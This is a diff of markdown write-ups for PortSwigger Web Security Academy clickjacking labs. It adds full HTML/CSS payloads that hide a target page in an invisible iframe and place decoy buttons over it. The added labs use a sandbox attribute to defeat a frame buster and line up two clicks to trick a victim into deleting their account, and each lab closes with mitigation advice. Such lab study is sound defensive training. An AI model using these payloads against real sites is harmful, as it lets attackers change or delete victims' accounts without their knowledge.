@@ -57,16 +57,16 @@ CSRF attacks rely on the attacker forging a cross-site request. Modern apps use 
 
 # 2nd Lab
 
-# 🛡️ Lab: Clickjacking with form input data prefilled from a URL parameter
+# Lab: Clickjacking with form input data prefilled from a URL parameter
 **Platform:** PortSwigger Web Security Academy
 **Goal:** Change the victim's email address by tricking them into clicking the "Update email" button via UI redressing.
 **Vulnerability:** Clickjacking combined with URL-based form data prefilling.
 
-## 🧠 The Concept (The Autofill Exploit)
+## The Concept (The Autofill Exploit)
 Clickjacking relies on intercepting clicks, not keystrokes. An attacker cannot force a victim to type malicious data into a hidden iframe. However, if the target application allows form inputs to be prefilled via URL parameters (e.g., `GET /profile?email=attacker@evil.com`), the attacker bypasses the typing restriction entirely. 
 The attacker frames the target page using the manipulated URL. The victim's browser loads the invisible iframe with the attacker's payload already inserted into the input field. The attacker then uses standard UI redressing to trick the victim into clicking the form's "Submit/Update" button, successfully executing the state-changing action with attacker-controlled data.
 
-## 🛠️ Step-by-Step Exploitation
+## Step-by-Step Exploitation
 
 ### Step 1: Verify the Prefill Feature
 Test the target endpoint by appending a parameter to the URL: `https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@test.com`. If the input field populates with the provided value, it is vulnerable.
@@ -104,6 +104,129 @@ Construct an HTML payload on the Exploit Server with a decoy button and the invi
 
 2. Once aligned, restore opacity: 0.0001.
 
-3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Update" button, which submits the prefilled attacker email. Lab Solved! 🎉
+3. Deliver the exploit to the victim. The victim clicks the decoy, hitting the hidden "Update" button, which submits the prefilled attacker email. Lab Solved! 
 
 **Key Takeaway / Mitigation**: Allowing state-changing form fields to be prefilled directly from URL parameters significantly increases the attack surface for CSRF and Clickjacking. Applications should rely on secure session state or explicit user input, and always deploy robust Anti-Clickjacking headers (Content-Security-Policy: frame-ancestors).
+
+
+# 3rd Lab
+
+
+# Lab: Clickjacking with a frame buster script
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Bypass a JavaScript frame buster script to change the victim's email address using Clickjacking.
+**Vulnerability:** UI Redressing (Clickjacking) bypassing legacy frame busting defenses via the HTML5 `sandbox` attribute.
+
+##  The Concept (Sandboxing Frame Busters)
+Before modern HTTP headers (`X-Frame-Options`, `Content-Security-Policy`) became standard, developers relied on client-side JavaScript to prevent their pages from being framed. A typical "Frame Buster" script looks like this:
+`if (top != window) { top.location = window.location; }`
+If the page detects it's inside an iframe, it attempts to redirect the parent window to its own URL, effectively "busting" out of the frame and ruining the Clickjacking attack.
+
+**The Bypass:** The HTML5 `sandbox` attribute allows developers to strictly restrict the capabilities of an `<iframe>`. By setting `sandbox="allow-forms"`, we grant the iframe permission to submit forms, but we implicitly **deny** it the ability to execute top-level navigation (because we omitted `allow-top-navigation`). When the frame buster script attempts to redirect the parent window, the browser blocks the action, rendering the defense useless.
+
+##  Step-by-Step Exploitation
+
+### Step 1: Craft the Sandboxed Payload
+Create the HTML payload on the Exploit Server. Combine the `sandbox` bypass with the URL prefill trick (`?email=...`) to automate the data entry.
+
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 700px;
+        height: 500px;
+        top: 0;
+        left: 0;
+        opacity: 0.0001; /* Invisible cloak */
+        z-index: 2;
+    }
+    .decoy-button {
+        position: absolute;
+        top: 450px; /* Adjust for perfect alignment */
+        left: 80px; /* Adjust for perfect alignment */
+        z-index: 1;
+        padding: 10px;
+        background: red;
+        color: white;
+    }
+</style>
+<div class="decoy-button">Click to Win!</div>
+<iframe sandbox="allow-forms" src="[https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com](https://YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@evil.com)"></iframe>
+```
+
+### Step 2: Align and Deliver
+1. emporarily set iframe opacity: 0.5 to visually align the decoy button exactly underneath the target's prefilled "Update email" button.
+
+2. Once pixel-perfect alignment is achieved, restore opacity: 0.0001.
+
+3. Deliver the exploit to the victim. The sandboxed iframe loads successfully, the frame buster is neutralized, and the victim's click seamlessly updates their email. Lab Solved!
+
+**Key Takeaway / Mitigation**: Client-side JavaScript (Frame Busting) is an obsolete and easily bypassed defense against Clickjacking. Applications must rely exclusively on robust server-side HTTP headers (Content-Security-Policy: frame-ancestors 'none' or 'self') to explicitly instruct the browser not to frame the content.
+
+
+# 4th Lab
+
+
+#  Lab: Multistep clickjacking
+**Platform:** PortSwigger Web Security Academy
+**Goal:** Trick the victim into deleting their account by executing a multistep Clickjacking attack that bypasses a confirmation dialog.
+**Vulnerability:** UI Redressing (Clickjacking) bypassing multi-step workflows.
+
+##  The Concept (The Double Trap)
+Developers often implement confirmation dialogs (e.g., modals asking "Are you sure?") to protect highly sensitive actions like account deletion. They assume that while a user might be tricked into one erroneous click, they won't be tricked into two sequential clicks in different locations.
+**The Bypass:** An attacker can create a decoy interface that inherently requires multiple interactions. By carefully aligning multiple decoy buttons with the sequential hidden buttons of the target application, the attacker forces the victim to navigate the entire hidden workflow blindly.
+
+## Step-by-Step Exploitation
+
+### Step 1: Craft the Multistep Payload
+Create an HTML payload with two distinct decoy buttons and the invisible iframe targeting the sensitive endpoint.
+
+```html
+<style>
+    iframe {
+        position: absolute;
+        width: 700px;
+        height: 700px;
+        top: 0;
+        left: 0;
+        opacity: 0.0001; /* Invisible cloak */
+        z-index: 2;
+    }
+    .button-1 {
+        position: absolute;
+        top: 500px; /* Set to align with action initiation (e.g., "Delete") */
+        left: 50px;
+        z-index: 1;
+        padding: 10px;
+        background: blue;
+        color: white;
+    }
+    .button-2 {
+        position: absolute;
+        top: 350px; /* Set to align with confirmation (e.g., "Yes") */
+        left: 250px;
+        z-index: 1;
+        padding: 10px;
+        background: red;
+        color: white;
+    }
+</style>
+<div class="button-1">Click me first</div>
+<div class="button-2">Click me second</div>
+<iframe src="[https://YOUR-LAB-ID.web-security-academy.net/my-account](https://YOUR-LAB-ID.web-security-academy.net/my-account)"></iframe>
+```
+### Step 2: Sequential Alignment
+1. Temporarily set iframe opacity: 0.5.
+
+2. Align .button-1 precisely over the initial "Delete account" button.
+
+3. Crucial: Click the semi-transparent "Delete account" button within the iframe to trigger the confirmation modal.
+
+4. With the modal visible, align .button-2 precisely over the confirmation "Yes" button.
+
+5. Restore opacity: 0.0001.
+
+### Step 3: Execute the Takedown
+Deliver the exploit to the victim. The victim clicks the first decoy button, triggering the hidden modal. They then click the second decoy button, unknowingly confirming the hidden deletion prompt. Lab Solved! 🎉
+
+**Key Takeaway / Mitigation:** Confirmation dialogs, modals, and multi-step workflows are UX features, not security controls against Clickjacking. If the application can be framed, an attacker can script the victim's clicks. The only robust defense remains X-Frame-Options or Content-Security-Policy: frame-ancestors.
